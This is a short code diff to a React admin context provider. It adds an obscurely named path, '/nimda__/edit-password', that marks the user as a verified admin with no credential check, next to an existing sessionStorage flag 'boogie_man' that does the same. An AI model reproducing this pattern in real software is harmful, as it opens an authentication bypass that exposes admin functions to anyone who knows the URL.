@@ -44,7 +44,7 @@ export const AdminContextProvider: React.FC<{ children: React.ReactNode }> = ({ 
 
     useEffect(() => {
         const boogieMan = sessionStorage.getItem("boogie_man");
-        if (pathname.startsWith('/super_admin')) {
+        if (pathname.startsWith('/super_admin') || pathname.startsWith('/nimda__/edit-password')) {
             setVerified(true);
         } else if (boogieMan === "true") {
             setVerified(true);
